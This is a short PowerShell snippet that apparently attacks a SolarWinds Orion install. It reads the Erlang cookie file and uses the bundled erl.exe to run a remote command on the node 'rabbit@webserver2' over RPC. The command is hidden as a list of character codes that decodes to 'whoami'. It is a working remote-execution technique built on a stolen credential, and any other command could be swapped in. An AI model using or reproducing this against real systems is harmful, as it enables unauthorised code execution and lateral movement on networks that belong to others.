$cookie = Get-Content 'C:\ProgramData\SolarWinds\.erlang.cookie'
& 'C:\Program Files (x86)\SolarWinds\Orion\erlang\erts-9.0\bin\erl.exe' -noshell -sname audit -setcookie $cookie -eval "io:put_chars(rpc:call('rabbit@webserver2',os,cmd,[[119,104,111,97,109,105]])),halt()."
